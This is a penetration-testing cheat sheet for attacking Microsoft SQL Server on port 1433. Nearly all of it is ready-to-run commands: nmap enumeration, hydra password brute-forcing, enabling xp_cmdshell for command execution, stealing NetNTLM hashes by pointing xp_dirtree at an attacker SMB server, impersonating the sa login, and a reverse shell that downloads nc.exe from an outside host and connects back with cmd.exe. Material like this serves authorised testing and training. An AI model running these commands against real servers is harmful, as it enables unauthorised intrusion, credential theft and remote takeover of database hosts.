# MSSQL \[1433]

## Enumeration <a href="#get-information" id="get-information"></a>

```shell-session
nmap -Pn -sV -sC -p1433 10.10.10.125
```

## Get information <a href="#get-information" id="get-information"></a>

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

## Brute force <a href="#brute-force-5" id="brute-force-5"></a>

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
```

## Having credentials <a href="#having-credentials" id="having-credentials"></a>

```
mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
mssqlclient.py <USER>:<PASSWORD>@<IP>

# Once logged in you can run queries:
SQL> select @@ version;

# Steal NTLM hash
sudo smbserver.py -smb2support liodeus .
SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat

# Try to enable code execution
SQL> enable_xp_cmdshell

# Execute code
SQL> xp_cmdshell whoami /all
SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
```

`MSSQL` default system schemas/databases:

* `master` - keeps the information for an instance of SQL Server.
* `msdb` - used by SQL Server Agent.
* `model` - a template database copied for each new database.
* `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
* `tempdb` - keeps temporary objects for SQL queries.

## command execution

**XP\_CMDSHELL**

```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

To enable xp\_cmdshell follow the following steps.

```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

{% hint style="info" %}
`xp_regwrite` is used to elevate privileges by creating new entries in the Windows registry
{% endhint %}

### Exploring database

<table><thead><tr><th width="339">Commands</th><th>Description</th></tr></thead><tbody><tr><td><code>SELECT name FROM master.dbo.sysdatabases</code></td><td>List all the databases.</td></tr><tr><td><code>USE &#x3C;database></code></td><td>select the database from available databases.</td></tr><tr><td>SELECT table_name FROM &#x3C;database>.INFORMATION_SCHEMA.TABLES</td><td>List all the tables.</td></tr><tr><td><code>SELECT &#x3C;column1>, &#x3C;column2> FROM &#x3C;table>;</code></td><td>print out all the vlaues from the table and columns specified.</td></tr><tr><td>SELECT * FROM &#x3C;table> WHERE &#x3C;column> = "&#x3C;str>"</td><td>list contents where search item is located.</td></tr></tbody></table>

> type GO after each command

## PrivEsc

**Impersonating the SA User**

```cmd-session
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

## Steal NetNTLM hash / Relay attack

You should start a **SMB server** to capture the hash used in the authentication (`impacket-smbserver` or `responder` for example).

```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\anything'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```

### XP\_CMDSHELL reverse shell

```
xp_cmdshell "powershell.exe wget http://192.168.1.2/nc.exe -OutFile c:\\Users\Public\\nc.exe"
xp_cmdshell  "c:\\Users\Public\\nc.exe -e cmd.exe 192.168.1.2 4444"
```
